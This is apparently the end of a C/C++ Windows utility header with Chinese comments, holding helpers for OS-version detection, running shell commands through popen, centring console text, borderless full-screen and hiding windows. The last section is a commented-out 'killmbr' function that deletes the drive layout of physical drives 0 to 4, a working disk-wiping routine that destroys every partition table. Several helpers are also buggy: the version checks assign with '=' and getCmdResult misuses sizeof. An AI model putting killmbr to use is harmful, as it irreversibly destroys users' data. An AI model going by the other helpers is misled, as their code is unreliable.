	else if(osv.dwMajorVersion = 6 && osv.dwMinorVersion ==3)return "Windows 8.1";//or windows server 2012 R2
	else if(osv.dwMajorVersion = 6 && osv.dwMinorVersion ==2)return "Windows 8";//or windows server 2012
	else if(osv.dwMajorVersion = 6 && osv.dwMinorVersion ==1)return "Windows 7"; //or windows server 2008 R2
	else if(osv.dwMajorVersion = 6 && osv.dwMinorVersion ==0)return "Windows Vista";//or windows server 2008
	else if(osv.dwMajorVersion = 5 && osv.dwMinorVersion ==2)return "Windows server 2003";//or windows server 2003 R2
	else if(osv.dwMajorVersion = 5 && osv.dwMinorVersion ==1)return "Windows xp";
	else if(osv.dwMajorVersion = 5 && osv.dwMinorVersion ==1)return "Windows 2000";
	else return "err";
	
}

/******************************
 *  @brief     执行cmd命令并获得返回值 
 *  @Sample usage: getCmdResult("echo 1"); 
 *  @return 	返回值 
 *  @author     xbebhxx3
 *  @version    2.0
 *  @date       2022/3/5 
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
string getCmdResult(char Cmd[])  {
	char Result[1024000] = {0};
    char buf1[1024000] = {0};
    FILE *pf = NULL;
    snprintf(Cmd,sizeof(Cmd),"%s 2>&1",Cmd);
    if( (pf = popen(Cmd, "r")) == NULL ) return "";
    while(fgets(buf1, sizeof buf1, pf)) snprintf(Result,1024000,"%s%s",Result , buf1);
    pclose(pf);
    memset(Cmd,'\0',sizeof(Cmd));
    return Result;
}

/******************************
 *  @brief     居中输出 
 *  @param     str:要输出的字符串,y:输出到第几行; 
 *  @Sample usage:  OutoutMiddle(字符串,行数);
 *  @note		头文件： #include<Windows.h>
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2022/3/8 
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
void OutoutMiddle(const char str[],int y){
	COORD pos;
	HANDLE hOutput = GetStdHandle(STD_OUTPUT_HANDLE);//获得输出的句柄
    CONSOLE_SCREEN_BUFFER_INFO bInfo;
    GetConsoleScreenBufferInfo(hOutput, &bInfo);//获取控制台屏幕缓冲区大小
    int dwSizeX=bInfo.dwSize.X,dwSizey=bInfo.dwSize.Y;
    int len=strlen(str);//获取要输出的字符串的长度
	int x=dwSizeX/2-len/2;
	pos.X = x; //横坐标
	pos.Y = y; //纵坐标
	SetConsoleCursorPosition(hOutput, pos);//移动光标 
	printf("%s",str);//输出 
}

//真·全屏 最大化 取消标题栏及边框#include<Windows.h>
void full_screen() {
	HWND hwnd = GetForegroundWindow();
	int cx = GetSystemMetrics(SM_CXSCREEN);            /* 屏幕宽度 像素 */
	int cy = GetSystemMetrics(SM_CYSCREEN);            /* 屏幕高度 像素 */

	LONG l_WinStyle = GetWindowLong(hwnd,GWL_STYLE);   /* 获取窗口信息 */
	/* 设置窗口信息 最大化 取消标题栏及边框 */
	SetWindowLong(hwnd,GWL_STYLE,(l_WinStyle | WS_POPUP | WS_MAXIMIZE) & ~WS_CAPTION & ~WS_THICKFRAME & ~WS_BORDER);

	SetWindowPos(hwnd, HWND_TOP, 0, 0, cx+18, cy, 0);
}

//隐藏窗口 #include<Windows.h>
void HideWindow(){
	ShowWindow(GetForegroundWindow(),SW_HIDE);
} 

/******************************
 *  @brief     破坏mbr(very danger) 
 *  @Sample usage:  killmbr();
 *  @note		头文件： #include<Windows.h> #include<ntddscsi.h> 
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2022/3/8 
 #  Copyright (c) 2022-2077 xbebhxx3


void killmbr(){
    DWORD lpBytesReturned;
    OVERLAPPED lpOverlapped={0};
    HANDLE DiskHandle=CreateFile("\\\\.\\PhysicalDrive0",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);//破坏mbr 
    DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
    DiskHandle=CreateFile("\\\\.\\PhysicalDrive1",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
    DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
    DiskHandle=CreateFile("\\\\.\\PhysicalDrive2",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
    DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
    DiskHandle=CreateFile("\\\\.\\PhysicalDrive3",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
    DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
    DiskHandle=CreateFile("\\\\.\\PhysicalDrive4",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
    DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
}
******************************/
#endif
